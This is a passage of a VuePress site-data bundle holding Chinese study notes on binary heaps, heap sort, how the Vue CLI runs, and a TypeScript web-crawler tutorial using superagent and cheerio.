二叉堆可以快速找出最大值或最小值，所以常被用于优先队列，也用于堆排序算法。二叉堆同层的大小是不明确的，取决于同层元素插入的先后顺序。\n\n\n\n# 二叉堆实现\n\n    二叉堆实现代码细节：heap.ts\n\n    1.声明一个受保护的变量heap用于存储元素，类型是数组；再声明一个受保护的变量comparefn用于存储比较函数。如果在初始化时，传进来的比较函数是升序，代表这将是一个最小堆，反之比较函数是降序，代表这将是一个最大堆。还有，使用的数组实现的，使用链表比较耗内存。\n\n    2.当前节点与父节点、左右子节点在数组中的关系。左节点：index * 2 + 1；右节点：index * 2 + 2；父节点：math.floor((index - 1) / 2)。\n\n    3.insert方法，先放在数组最后面，再对它进行上移处理，即与它的父节点比较大小，符合comparefn要求的不会处理，否则就要将父节点与当前节点的值对换。\n\n\n    3.extract方法，移除二叉堆的根节点，也就是最大堆的最大值，最小堆的最小值。用数组末尾的值补上根节点的值，然后进行下移处理，重新梳理二叉树。\n\n\n\n# 堆排序\n\n    堆排序实现代码细节：heap.ts和heap.ts\n\n    1.有一个未经排序的数组，将它构造成一个二叉堆形式的数组。\n    2.将二叉堆的根节点与“末尾”对调，将新的根节点的值进行下移操作，一直对这个值进行下移，直到这个值最终会落到合适的位置；再将二叉堆新的根节点与“末尾减一”对调，重复之前的操作......直到根节点与“末尾减n”重合，最后得出的数组就是一个堆排序后的新数组。\n    最简单的理解其实就是一直调用extract，直到数组为空，真正去实现的时候有细微差别。\n",charsets:{cjk:!0}},{title:"学习JavaScript数据结构与算法",frontmatter:{},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/",relativePath:"book-web/数据结构与算法/README.md",key:"v-fdc5ab4e",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/",headers:[{level:2,title:"内容简介",slug:"内容简介",normalizedTitle:"内容简介",charIndex:26},{level:2,title:"介绍",slug:"介绍",normalizedTitle:"介绍",charIndex:165},{level:2,title:"环境和工具",slug:"环境和工具",normalizedTitle:"环境和工具",charIndex:345}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"内容简介 介绍 环境和工具",content:"# 学习JavaScript数据结构与算法\n\n\n# 内容简介\n\n * 1.环境搭建\n * 2.栈\n * 3.队列\n * 4.链表\n * 5.集合\n * 6.字典和散列表\n * 7.递归\n * 8.树\n * 9.二叉堆和堆排序\n * 10.图\n * 11.排序和搜索算法\n * 12.算法设计与技巧\n * 13.算法复杂度\n\n\n# 介绍\n\n * 跟着《学习JavaScript数据结构与算法》来编写自己的数据结构代码库（使用JavaScript的超集TypeScript来编写），项目地址是https://gitee.com/liawnliu/datastructures_ts.git\n\n * 后面有时间会考虑使用其他语言写一遍，还有部分数据结构没有写上去，有时间再来补充和优化。\n\n\n# 环境和工具\n\n * 使用到工具有：vscode、 git、 node.js、 chai、 mocha、 nyc、 processon......\n\n * 使用的命令：\n\ngit clone xxx // 下载本仓库到本地\nnpm install // 初始化本项目\nnpm run dev // 查看本项目测试覆盖情况\n\n\n1\n2\n3\n",normalizedContent:"# 学习javascript数据结构与算法\n\n\n# 内容简介\n\n * 1.环境搭建\n * 2.栈\n * 3.队列\n * 4.链表\n * 5.集合\n * 6.字典和散列表\n * 7.递归\n * 8.树\n * 9.二叉堆和堆排序\n * 10.图\n * 11.排序和搜索算法\n * 12.算法设计与技巧\n * 13.算法复杂度\n\n\n# 介绍\n\n * 跟着《学习javascript数据结构与算法》来编写自己的数据结构代码库（使用javascript的超集typescript来编写），项目地址是https://gitee.com/liawnliu/datastructures_ts.git\n\n * 后面有时间会考虑使用其他语言写一遍，还有部分数据结构没有写上去，有时间再来补充和优化。\n\n\n# 环境和工具\n\n * 使用到工具有：vscode、 git、 node.js、 chai、 mocha、 nyc、 processon......\n\n * 使用的命令：\n\ngit clone xxx // 下载本仓库到本地\nnpm install // 初始化本项目\nnpm run dev // 查看本项目测试覆盖情况\n\n\n1\n2\n3\n",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/",relativePath:"book-web/画板项目/技术方案/README.md",key:"v-25bb4771",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/",lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"整体架构设计",frontmatter:{},regularPath:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html",relativePath:"book-web/画板项目/技术方案/整体架构设计.md",key:"v-4b6c4615",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html",headers:[{level:2,title:"需求",slug:"需求",normalizedTitle:"需求",charIndex:13},{level:2,title:"范围",slug:"范围",normalizedTitle:"范围",charIndex:82},{level:2,title:"模块设计",slug:"模块设计",normalizedTitle:"模块设计",charIndex:105},{level:2,title:"作品的数据结构",slug:"作品的数据结构",normalizedTitle:"作品的数据结构",charIndex:190},{level:2,title:"扩展保证性",slug:"扩展保证性",normalizedTitle:"扩展保证性",charIndex:228},{level:2,title:"运维保障",slug:"运维保障",normalizedTitle:"运维保障",charIndex:289}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"需求 范围 模块设计 作品的数据结构 扩展保证性 运维保障",content:"# 整体架构设计\n\n\n# 需求\n\n开发出类似https://www.processon.com/、https://whimsical.com/的在线工具。\n\n\n# 范围\n\n整体设计、架构设计、没有细节\n\n\n# 模块设计\n\n模块的拆分和关系图，结果 模块的关键功能，职责等\n\n特殊的模块重点说明\n\n * 组件库，独立第三方，同时用于编辑和H5\n * 自研统计服务，为何自研\n\n\n# 作品的数据结构\n\nvuex store的结构，解释 数据流转关系图\n\n\n# 扩展保证性\n\n扩展组件，数据结构层面 扩展编辑器的功能，例如：组件隐藏、锁定vnode 扩展页面的配置 开发提效\n\n\n# 运维保障\n\n线上服务和运维服务 安全 监控和报警 服务扩展性：流量大",normalizedContent:"# 整体架构设计\n\n\n# 需求\n\n开发出类似https://www.processon.com/、https://whimsical.com/的在线工具。\n\n\n# 范围\n\n整体设计、架构设计、没有细节\n\n\n# 模块设计\n\n模块的拆分和关系图，结果 模块的关键功能，职责等\n\n特殊的模块重点说明\n\n * 组件库，独立第三方，同时用于编辑和h5\n * 自研统计服务，为何自研\n\n\n# 作品的数据结构\n\nvuex store的结构，解释 数据流转关系图\n\n\n# 扩展保证性\n\n扩展组件，数据结构层面 扩展编辑器的功能，例如：组件隐藏、锁定vnode 扩展页面的配置 开发提效\n\n\n# 运维保障\n\n线上服务和运维服务 安全 监控和报警 服务扩展性：流量大",charsets:{cjk:!0}},{title:"脚手架框架搭建和架构设计",frontmatter:{},regularPath:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/1.%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%92%8C%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html",relativePath:"book-web/画板项目/脚手架开发/1.框架搭建和架构设计.md",key:"v-6d2971ec",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/1.%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%92%8C%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html",headers:[{level:2,title:"脚手架开发入门",slug:"脚手架开发入门",normalizedTitle:"脚手架开发入门",charIndex:19},{level:3,title:"脚手架简介",slug:"脚手架简介",normalizedTitle:"脚手架简介",charIndex:31},{level:3,title:"脚手架的执行原理",slug:"脚手架的执行原理",normalizedTitle:"脚手架的执行原理",charIndex:746},{level:3,title:"脚手架开发流程及难点",slug:"脚手架开发流程及难点",normalizedTitle:"脚手架开发流程及难点",charIndex:4451},{level:3,title:"开发一个脚手架demo",slug:"开发一个脚手架demo",normalizedTitle:"开发一个脚手架demo",charIndex:5626}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"脚手架开发入门 脚手架简介 脚手架的执行原理 脚手架开发流程及难点 开发一个脚手架demo",content:"# 脚手架框架搭建和架构设计\n\n\n# 脚手架开发入门\n\n\n# 脚手架简介\n\n脚手架本质是一个“操作系统”的客户端，它通过命令行执行，例如\n\nvue create vue-test-app\n\n\n1\n\n\n上面这条命令由3个部分组成：\n\n * 主命令：vue\n * command：create\n * command的param：vue-test-app\n\n它表示创建一个vue项目，项目的名称为vue-test-app，以上是一个较为简单的脚手架命令，但实际场景往往更加复杂，比如：\n\n当前目录已经有文件了，我们需要覆盖当前目录下的文件，强制进行安装vue项目，此时我们就可以输入：\n\nvue create vue-test-app --force\n\n\n1\n\n\n这里的--force叫做option，用来辅助脚手架确认在特定场景下用户的选择（可以理解为配置）。还有一种场景：\n\n通过vue create创建项目时，会自动执行npm install帮用户安装依赖，如果我们希望使用淘宝源来安装，可以输入命令：\n\nvue create vue-test-app --force -r http://registry.npm.taobao.org\n\n\n1\n\n\n这里的-r也叫做option，它与--force不同的是它使用-，并且使用简写，这里的-r也可以替换成--registry。其实可以输入以下命令来查看vue create支持的所有options\n\nvue create --help\n\n\n1\n\n\n-r http://registry.npm.taobao.org后面的路径是option的param，其实--force可以理解为--force true，简写为--force或-f。\n\n\n# 脚手架的执行原理\n\n那么输入完vue create vue-test-app，终端是如何处理的呢？\n\n\n\n终端会通过npm环境变量（如上图）来找到vue这个主命令。我们可以在终端中输入which vue来找到这个vue指令存储在哪。输入输出如下：\n\n$ which vue\n/c/Users/Administrator/AppData/Roaming/npm/vue\n\n\n1\n2\n\n\n根据这个/c/Users/Administrator/AppData/Roaming/npm/vue输出（也有可能是/d/nodejs/vue），我们可以打开我们电脑本地这个目录，目录内容如下。\n\n\n\n有三个同名vue文件，是操作系统里的可执行脚本，表示可以用minTTY(Git Bash)、winpty(cmd)、PowerShell分别打开这三个文件，它们似乎都在用node来运行同目录下的node_modules/@vue/cli/bin/vue.js。\n\n题外话，如果用到的是yarn安装的v-cli，那么它的目录是C:\\Users\\liawn\\AppData\\Local\\Yarn\\Data\\global\\node_modules，至于命令则是在C:\\Users\\liawn\\AppData\\Local\\Yarn\\Data\\global\\node_modules\\.bin。\n\n这里的node_modules是全局依赖包安装的地方，你可以回想一下当时安装v-cli脚手架的命令是不是npm install -g @vue/cli。我们继续找到并打开node_modules/@vue/cli/bin/vue.js，会发现里面有我们非常熟悉的create、serve、build等命令（方法），以下是抽取了部分代码块。\n\n#!/usr/bin/env node\nconst { chalk, semver } = require('@vue/cli-shared-utils')\nconst requiredVersion = require('../package.json').engines.node\nconst leven = require('leven')\nfunction checkNodeVersion (wanted, id) {\n  if (!semver.satisfies(process.version, wanted, { includePrerelease: true })) {\n    // 省略...\n    process.exit(1)\n  }\n}\ncheckNodeVersion(requiredVersion, '@vue/cli')\nconst EOL_NODE_MAJORS = ['8.x', '9.x', '11.x', '13.x']\nfor (const major of EOL_NODE_MAJORS) {\n  if (semver.satisfies(process.version, major)) {\n    // 省略...\n  }\n}\nconst fs = require('fs')\nconst path = require('path')\nconst slash = require('slash')\nconst minimist = require('minimist')\nif (\n  slash(process.cwd()).indexOf('/packages/test') > 0 && (\n    fs.existsSync(path.resolve(process.cwd(), '../@vue')) ||\n    fs.existsSync(path.resolve(process.cwd(), '../../@vue'))\n  )\n) {\n  process.env.VUE_CLI_DEBUG = true\n}\nconst program = require('commander')\nconst loadCommand = require('../lib/util/loadCommand')\nprogram\n  .version(`@vue/cli ${require('../package').version}`)\n  .usage('<command> [options]')\n\nprogram\n  .command('create <app-name>')\n  .option('-r, --registry <url>', 'Use specified npm registry when installing dependencies (only for npm)')\n  .option('-f, --force', 'Overwrite target directory if it exists')\n  .action((name, cmd) => {\n    const options = cleanArgs(cmd)\n    if (minimist(process.argv.slice(3))._.length > 1) {\n      console.log(chalk.yellow('\\n Info: You provided more than one argument. The first one will be used as the app\\'s name, the rest are ignored.'))\n    }\n    if (process.argv.includes('-g') || process.argv.includes('--git')) {\n      options.forceGit = true\n    }\n    require('../lib/create')(name, options)\n  })\nprogram\n  .command('serve [entry]')\n  .option('-o, --open', 'Open browser')\n  .action((entry, cmd) => {\n    loadCommand('serve', '@vue/cli-service-global').serve(entry, cleanArgs(cmd))\n  })\nprogram\n  .command('build [entry]')\n  .option('-t, --target <target>', 'Build target (app | lib | wc | wc-async, default: app)')\n  .action((entry, cmd) => {\n    loadCommand('build', '@vue/cli-service-global').build(entry, cleanArgs(cmd))\n  })\n\n// 省略...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n在总结“脚手架执行原理”之前先说一个细节，bin/vue.js的最顶部有一行#!/usr/bin/env node代码，它的作用是什么呢？#!/usr/bin/env node可以帮助bin/vue.js找到系统变量里的node.exe，那么就可以直接用./vue.js create test-app来创建一个vue项目。\n\n\n\n这是因为在Linux等系统下用ln -s vue bin/vue.js类似的命令给bin/vue.js生成了一个软链接，将这个软链接放到了npm环境变量中，供其他人直接使用vue指令，而Windows系统下的软链接其实是“快捷方式”，但是你也看到上面的三个vue指令并不是快捷方式而是系统可执行文件。也就是说在不同的系统里，在不同的终端里，最终都是要去执行node_modules/@vue/cli/bin/vue.js。\n\n脚手架执行原理总的来说就是：\n\n * v-cli脚手架在npm环境变量对应的目录下存放了软链接或者可执行脚本，那么就可以在操作系统各处都可以运行vue指令了。\n * vue指令的功能是运行npm全局依赖包v-cli里的bin/vue.js，具体是通过调用本地的node执行js的。\n * 最后根据vue command param里携带的command和param来运行bin/vue.js里对应的程序块。\n\n\n# 脚手架开发流程及难点\n\n开发流程：\n\n * 创建npm项目\n * 创建脚手架入口文件，最上方添加：#!/usr/bin/env node\n * 配置package.json，添加bin属性\n * 编写脚手架代码\n * 将脚手架发布到npm\n\n开发难点：\n\n * 分包：将复杂的系统拆分成若干个模块\n\n * 命令注册：例\n   \n   vue create\n   vue add\n   vue invoke\n   \n   \n   1\n   2\n   3\n   \n\n * 参数解析：vue command [options] <params>\n   \n   * options全称：--version、--help\n   * options简写：-V、-h\n   * 带params的options：--path /Users/caimengxin/Desktop/vue-test\n   * 帮助文档：\n     \n     * global help\n       \n       * Usage\n       * Options\n       * Commands\n     \n     * 示例，vue的帮助信息：\n       \n       Usage: vue <command> [options]\n       \n       Options:\n       -V, --version                              output the version number\n       -h, --help                                 output usage information\n       \n       Commands:\n       create [options] <app-name>                create a new project powered by vue-cli-service\n       add [options] <plugin> [pluginOptions]     install a plugin and invoke its generator in an already created project\n       // ...省略\n       \n       \n       1\n       2\n       3\n       4\n       5\n       6\n       7\n       8\n       9\n       10\n       \n\n * 命令行交互\n\n * 日志打印\n\n * 命令行文字变色\n\n * 网络通信：HTTP、WebSocket\n\n * 文件处理\n\n\n# 开发一个脚手架demo",normalizedContent:"# 脚手架框架搭建和架构设计\n\n\n# 脚手架开发入门\n\n\n# 脚手架简介\n\n脚手架本质是一个“操作系统”的客户端，它通过命令行执行，例如\n\nvue create vue-test-app\n\n\n1\n\n\n上面这条命令由3个部分组成：\n\n * 主命令：vue\n * command：create\n * command的param：vue-test-app\n\n它表示创建一个vue项目，项目的名称为vue-test-app，以上是一个较为简单的脚手架命令，但实际场景往往更加复杂，比如：\n\n当前目录已经有文件了，我们需要覆盖当前目录下的文件，强制进行安装vue项目，此时我们就可以输入：\n\nvue create vue-test-app --force\n\n\n1\n\n\n这里的--force叫做option，用来辅助脚手架确认在特定场景下用户的选择（可以理解为配置）。还有一种场景：\n\n通过vue create创建项目时，会自动执行npm install帮用户安装依赖，如果我们希望使用淘宝源来安装，可以输入命令：\n\nvue create vue-test-app --force -r http://registry.npm.taobao.org\n\n\n1\n\n\n这里的-r也叫做option，它与--force不同的是它使用-，并且使用简写，这里的-r也可以替换成--registry。其实可以输入以下命令来查看vue create支持的所有options\n\nvue create --help\n\n\n1\n\n\n-r http://registry.npm.taobao.org后面的路径是option的param，其实--force可以理解为--force true，简写为--force或-f。\n\n\n# 脚手架的执行原理\n\n那么输入完vue create vue-test-app，终端是如何处理的呢？\n\n\n\n终端会通过npm环境变量（如上图）来找到vue这个主命令。我们可以在终端中输入which vue来找到这个vue指令存储在哪。输入输出如下：\n\n$ which vue\n/c/users/administrator/appdata/roaming/npm/vue\n\n\n1\n2\n\n\n根据这个/c/users/administrator/appdata/roaming/npm/vue输出（也有可能是/d/nodejs/vue），我们可以打开我们电脑本地这个目录，目录内容如下。\n\n\n\n有三个同名vue文件，是操作系统里的可执行脚本，表示可以用mintty(git bash)、winpty(cmd)、powershell分别打开这三个文件，它们似乎都在用node来运行同目录下的node_modules/@vue/cli/bin/vue.js。\n\n题外话，如果用到的是yarn安装的v-cli，那么它的目录是c:\\users\\liawn\\appdata\\local\\yarn\\data\\global\\node_modules，至于命令则是在c:\\users\\liawn\\appdata\\local\\yarn\\data\\global\\node_modules\\.bin。\n\n这里的node_modules是全局依赖包安装的地方，你可以回想一下当时安装v-cli脚手架的命令是不是npm install -g @vue/cli。我们继续找到并打开node_modules/@vue/cli/bin/vue.js，会发现里面有我们非常熟悉的create、serve、build等命令（方法），以下是抽取了部分代码块。\n\n#!/usr/bin/env node\nconst { chalk, semver } = require('@vue/cli-shared-utils')\nconst requiredversion = require('../package.json').engines.node\nconst leven = require('leven')\nfunction checknodeversion (wanted, id) {\n  if (!semver.satisfies(process.version, wanted, { includeprerelease: true })) {\n    // 省略...\n    process.exit(1)\n  }\n}\nchecknodeversion(requiredversion, '@vue/cli')\nconst eol_node_majors = ['8.x', '9.x', '11.x', '13.x']\nfor (const major of eol_node_majors) {\n  if (semver.satisfies(process.version, major)) {\n    // 省略...\n  }\n}\nconst fs = require('fs')\nconst path = require('path')\nconst slash = require('slash')\nconst minimist = require('minimist')\nif (\n  slash(process.cwd()).indexof('/packages/test') > 0 && (\n    fs.existssync(path.resolve(process.cwd(), '../@vue')) ||\n    fs.existssync(path.resolve(process.cwd(), '../../@vue'))\n  )\n) {\n  process.env.vue_cli_debug = true\n}\nconst program = require('commander')\nconst loadcommand = require('../lib/util/loadcommand')\nprogram\n  .version(`@vue/cli ${require('../package').version}`)\n  .usage('<command> [options]')\n\nprogram\n  .command('create <app-name>')\n  .option('-r, --registry <url>', 'use specified npm registry when installing dependencies (only for npm)')\n  .option('-f, --force', 'overwrite target directory if it exists')\n  .action((name, cmd) => {\n    const options = cleanargs(cmd)\n    if (minimist(process.argv.slice(3))._.length > 1) {\n      console.log(chalk.yellow('\\n info: you provided more than one argument. the first one will be used as the app\\'s name, the rest are ignored.'))\n    }\n    if (process.argv.includes('-g') || process.argv.includes('--git')) {\n      options.forcegit = true\n    }\n    require('../lib/create')(name, options)\n  })\nprogram\n  .command('serve [entry]')\n  .option('-o, --open', 'open browser')\n  .action((entry, cmd) => {\n    loadcommand('serve', '@vue/cli-service-global').serve(entry, cleanargs(cmd))\n  })\nprogram\n  .command('build [entry]')\n  .option('-t, --target <target>', 'build target (app | lib | wc | wc-async, default: app)')\n  .action((entry, cmd) => {\n    loadcommand('build', '@vue/cli-service-global').build(entry, cleanargs(cmd))\n  })\n\n// 省略...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n在总结“脚手架执行原理”之前先说一个细节，bin/vue.js的最顶部有一行#!/usr/bin/env node代码，它的作用是什么呢？#!/usr/bin/env node可以帮助bin/vue.js找到系统变量里的node.exe，那么就可以直接用./vue.js create test-app来创建一个vue项目。\n\n\n\n这是因为在linux等系统下用ln -s vue bin/vue.js类似的命令给bin/vue.js生成了一个软链接，将这个软链接放到了npm环境变量中，供其他人直接使用vue指令，而windows系统下的软链接其实是“快捷方式”，但是你也看到上面的三个vue指令并不是快捷方式而是系统可执行文件。也就是说在不同的系统里，在不同的终端里，最终都是要去执行node_modules/@vue/cli/bin/vue.js。\n\n脚手架执行原理总的来说就是：\n\n * v-cli脚手架在npm环境变量对应的目录下存放了软链接或者可执行脚本，那么就可以在操作系统各处都可以运行vue指令了。\n * vue指令的功能是运行npm全局依赖包v-cli里的bin/vue.js，具体是通过调用本地的node执行js的。\n * 最后根据vue command param里携带的command和param来运行bin/vue.js里对应的程序块。\n\n\n# 脚手架开发流程及难点\n\n开发流程：\n\n * 创建npm项目\n * 创建脚手架入口文件，最上方添加：#!/usr/bin/env node\n * 配置package.json，添加bin属性\n * 编写脚手架代码\n * 将脚手架发布到npm\n\n开发难点：\n\n * 分包：将复杂的系统拆分成若干个模块\n\n * 命令注册：例\n   \n   vue create\n   vue add\n   vue invoke\n   \n   \n   1\n   2\n   3\n   \n\n * 参数解析：vue command [options] <params>\n   \n   * options全称：--version、--help\n   * options简写：-v、-h\n   * 带params的options：--path /users/caimengxin/desktop/vue-test\n   * 帮助文档：\n     \n     * global help\n       \n       * usage\n       * options\n       * commands\n     \n     * 示例，vue的帮助信息：\n       \n       usage: vue <command> [options]\n       \n       options:\n       -v, --version                              output the version number\n       -h, --help                                 output usage information\n       \n       commands:\n       create [options] <app-name>                create a new project powered by vue-cli-service\n       add [options] <plugin> [pluginoptions]     install a plugin and invoke its generator in an already created project\n       // ...省略\n       \n       \n       1\n       2\n       3\n       4\n       5\n       6\n       7\n       8\n       9\n       10\n       \n\n * 命令行交互\n\n * 日志打印\n\n * 命令行文字变色\n\n * 网络通信：http、websocket\n\n * 文件处理\n\n\n# 开发一个脚手架demo",charsets:{cjk:!0}},{title:"README",frontmatter:{},regularPath:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/",relativePath:"book-web/画板项目/脚手架开发/README.md",key:"v-2ac88107",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/",lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:null,content:"# README\n\n脚手架的实现原理（以及调试技巧）\n\nLerna的常见用法（多package项目管理痛点和解决方案）\n\n架构设计技巧和架构图绘制（以架构师角度思考基础架构问题）\n\nyargs的使用",normalizedContent:"# readme\n\n脚手架的实现原理（以及调试技巧）\n\nlerna的常见用法（多package项目管理痛点和解决方案）\n\n架构设计技巧和架构图绘制（以架构师角度思考基础架构问题）\n\nyargs的使用",charsets:{cjk:!0}},{title:"1.用ts编写小爬虫",frontmatter:{title:"1.用ts编写小爬虫"},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/1.%E7%94%A8ts%E7%BC%96%E5%86%99%E5%B0%8F%E7%88%AC%E8%99%AB.html",relativePath:"book-web/项目/react+express+ts写爬虫/1.用ts编写小爬虫.md",key:"v-0f8b7cba",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/1.%E7%94%A8ts%E7%BC%96%E5%86%99%E5%B0%8F%E7%88%AC%E8%99%AB.html",headers:[{level:2,title:"初始化项目",slug:"初始化项目",normalizedTitle:"初始化项目",charIndex:15},{level:2,title:"使用superagent",slug:"使用superagent",normalizedTitle:"使用superagent",charIndex:103},{level:2,title:"使用cheerio",slug:"使用cheerio",normalizedTitle:"使用cheerio",charIndex:463},{level:2,title:"使用node自带的fs处理文件",slug:"使用node自带的fs处理文件",normalizedTitle:"使用node自带的fs处理文件",charIndex:2502},{level:2,title:"模式优化",slug:"模式优化",normalizedTitle:"模式优化",charIndex:3188},{level:2,title:"爬虫代码清单",slug:"爬虫代码清单",normalizedTitle:"爬虫代码清单",charIndex:3303},{level:2,title:"编译运行",slug:"编译运行",normalizedTitle:"编译运行",charIndex:8539}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"初始化项目 使用superagent 使用cheerio 使用node自带的fs处理文件 模式优化 爬虫代码清单 编译运行",content:"# 用ts编写小爬虫\n\n\n# 初始化项目\n\n创建package.json和tsconfig.json，便捷的命令是npm init -y和tsc --init，当然你也可以手动创建手动添加配置项。\n\n\n# 使用superagent\n\nsuperagent是一个请求代理模块，可以使用它在node环境中发送ajax请求。\n\n先安装它，npm install superagent --save，然后再安装它的.d.ts类型声明文件，npm install @types/superagent --D。\n\n我们主要使用它的superagent.get方法，会去请求链接，然后返回我们要爬取的内容。\n\nprivate async getSourHtml(): Promise<string> {\n    const response: superagent.Response = await superagent.get(this._url);\n    return response.text;\n}\n\n\n1\n2\n3\n4\n\n\n\n# 使用cheerio\n\n我们需要对爬取到的html内容进行分析提取，可以通过cheerio来获取html内容里的模块组成。\n\nprivate getRankInfo(html: string): IrankInfo {\n    // 将html字符串用cheerio转为dom元素\n    this._$ = cheerio.load(html);\n    // 文章信息在id为allupdate的ul里\n    const rankHtml: cheerio.Cheerio = this._$('.rank_main');\n    // console.log('rankHtml', rankHtml.html());\n    // 最后要返回的值\n    const rankInfo: IrankInfo = { name: '', list: new Array<Irank>() };\n    // 标题\n    const nameHtml = this._$(rankHtml).find('.rank_banner .rank_i_title_name')?.children();\n    rankInfo.name = nameHtml ? nameHtml.text() : '人气排行榜';\n    // 榜单清单\n    const listHtml = this._$(rankHtml).find('.rank_i_lists .rank_i_p_list');\n    listHtml.map((index, value) => {\n        if ([0, 2, 4, 5].includes(index)) { // 只收取有点击数的，其他的暂时不作处理\n            const name: string = unescapeCode(this._$(value).find('.rank_i_p_tit').text());\n            const list: Ibook[] = this.handleBookInfo(this._$(value).find('.rank_i_li'));\n            rankInfo.list.push({ name, list });\n        }\n    });\n    return rankInfo;\n}\nprivate handleBookInfo(obj: cheerio.Cheerio): Ibook[] {\n    const bookArr: Ibook[] = [];\n    obj.map((index, value) => {\n        let num = '';\n        let bookName = '';\n        let bookCount = '';\n        if (index === 0) {\n            const data = this._$(value).children();\n            num = unescapeCode(data.eq(0).text());\n            bookName = unescapeCode(data.eq(1).children().eq(0).text());\n            bookCount = unescapeCode(data.eq(1).children().eq(3).text());\n            bookCount = bookCount.replace(/[^0-9]/ig, ''); // 将非数字去掉\n        } else {\n            const data = this._$(value).children();\n            num = unescapeCode(data.eq(0).text());\n            bookName = unescapeCode(data.eq(1).children().eq(0).text());\n            bookCount = unescapeCode(data.eq(2).text());\n        }\n        bookArr.push({ num, bookName, bookCount });\n    });\n    return bookArr;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 使用node自带的fs处理文件\n\n首先是读取旧文件里的东西：fs.readFileSync(filePath, 'utf-8')，并将它转成json对象，再将新内容添加到json对象里，最后又将json对象转为json字符串。后面由于更改了需求，没有必要追加到以前的数据上，直接使用新数据。\n\nprivate generateJsonData(rankInfo: IrankInfo, filePath: string): string {\n    let fileContent: IrankInfo = null;\n    /* if (fs.existsSync(filePath)) {\n        // 旧数据：从旧文件中读取的是json字符串，转成json\n        fileContent = JSON.parse(fs.readFileSync(filePath, 'utf-8'));\n    } */\n    // 构造新数据，返回记得转成json字符串。其实旧数据被覆盖了，其实也不需要旧数据\n    fileContent = rankInfo;\n\n    return JSON.stringify(fileContent);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n有了json字符串后，需要重新将它写入文件\n\nprivate writeFile(jsonData: string) {\n    fs.writeFileSync(this._filePath, jsonData);\n}\n\n\n1\n2\n3\n\n\n\n# 模式优化\n\n使用组合模式将分析html那块单独抽离，并且抽象出一个顶级的“分析器”，我们需要什么样的分析器再实现什么样的分析器。\n\n使用单例模式来用分析器，在全局中只要有分析器的一个实例就可以了，只需调用单例的公共方法。\n\n\n# 爬虫代码清单\n\ncrawler.ts\n\nimport fs from 'fs';\nimport path from 'path';\nimport superagent from 'superagent';\n\nexport interface IAnalyzer {\n    analysis: (html: string, filePath: string) => string\n}\n\n/**\n * @description 使用ts写一个爬虫(优化crawler1.ts)\n * @author LiawnLiu\n * @version 1.0.0\n */\nexport default class Crawler {\n    private _filePath: string = path.resolve(__dirname, '../../data/book.json');\n    constructor(private _url: string, private _analyzer: IAnalyzer) {\n        // 开始爬取\n        